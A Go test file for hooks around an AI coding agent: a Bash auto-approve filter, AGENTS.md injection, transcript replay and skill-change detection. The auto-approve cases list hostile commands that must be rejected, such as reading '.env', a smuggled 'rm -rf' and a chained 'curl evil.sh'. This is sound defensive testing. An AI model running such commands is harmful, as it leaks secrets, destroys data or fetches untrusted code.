package patches

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestAutoapprove(t *testing.T) {
	cases := map[string]bool{
		"ls -la":                      true,
		"git status && git diff HEAD": true,
		"grep -rn foo . | head -5":    true,
		"cat README.md":               true,
		"cat .env":                    false,
		"rm file":                     false,
		"git push":                    false,
		"git branch new-feature":      false,
		"echo hi > out.txt":           false,
		"echo $(rm -rf x)":            false,
		"ls & curl evil.sh":           false,
		"go test ./...":               false,
	}
	for cmd, want := range cases {
		got := autoapproveHook(&Input{ToolName: "Bash", ToolInput: map[string]any{"command": cmd}}, time.Now()) != nil
		if got != want {
			t.Errorf("%q: approved=%v want %v", cmd, got, want)
		}
	}
}

func TestAgentsMd(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "AGENTS.md"), []byte("Use tabs."), 0o644)
	if !strings.Contains(out(agentsmdHook(&Input{Cwd: dir}, time.Now())), "Use tabs.") {
		t.Fatal("AGENTS.md not injected")
	}
	os.WriteFile(filepath.Join(dir, "CLAUDE.md"), []byte("x"), 0o644)
	if agentsmdHook(&Input{Cwd: dir}, time.Now()) != nil {
		t.Fatal("injected despite CLAUDE.md")
	}
}

func TestReplay(t *testing.T) {
	tr := filepath.Join(t.TempDir(), "t.jsonl")
	os.WriteFile(tr, []byte(`{"type":"user","message":{"content":"fix <bug>"}}
{"type":"assistant","message":{"content":[{"type":"text","text":"ok"},{"type":"tool_use","name":"Bash","input":{"command":"ls"}}]}}
`), 0o644)
	var b bytes.Buffer
	if err := WriteReplay(tr, &b); err != nil {
		t.Fatal(err)
	}
	h := b.String()
	for _, want := range []string{"fix &lt;bug&gt;", "tool: Bash", "</html>"} {
		if !strings.Contains(h, want) {
			t.Errorf("replay missing %q", want)
		}
	}
}

func TestSkillLock(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("CLAUDE_CONFIG_DIR", dir)
	sk := filepath.Join(dir, "skills", "a")
	os.MkdirAll(sk, 0o755)
	os.WriteFile(filepath.Join(sk, "SKILL.md"), []byte("v1"), 0o644)
	saveLock(hashSkills())
	if skilllockHook(&Input{}, time.Now()) != nil {
		t.Fatal("warned with no change")
	}
	os.WriteFile(filepath.Join(sk, "SKILL.md"), []byte("v2"), 0o644)
	if !strings.Contains(out(skilllockHook(&Input{}, time.Now())), "a (changed)") {
		t.Fatal("missed change")
	}
	if skilllockHook(&Input{}, time.Now()) != nil {
		t.Fatal("warned twice")
	}
}
